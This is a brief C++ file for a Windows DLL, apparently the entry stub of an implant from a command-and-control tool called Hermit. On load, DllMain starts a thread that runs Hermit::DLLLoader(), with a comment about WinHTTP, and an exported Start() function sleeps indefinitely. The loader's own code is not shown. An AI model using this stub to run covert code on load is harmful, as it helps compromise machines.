#include "hermit.hpp"

#define MAX_THREADS 3

DWORD WINAPI ThreadProc(LPVOID lpParam);
BOOL g_runFinished = FALSE;

DLLEXPORT VOID Start()
{
    while (TRUE)
    {
        Sleep(24*60*60*1000);
    }
}

DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    HANDLE hThread = NULL;

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // Execute the Run function within a new thread
            // because WinHTTP functions are not usable in DllMain.
            hThread = CreateThread(
                NULL,
                0,
                ThreadProc,
                hinstDLL,
                0,
                NULL
            );
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            if (lpvReserved != NULL)
            {
                break;
            }
            break;
    }

    return TRUE;
}

DWORD WINAPI ThreadProc(LPVOID lpParam)
{    
    Hermit::DLLLoader();

    g_runFinished = TRUE;

    return 0;
}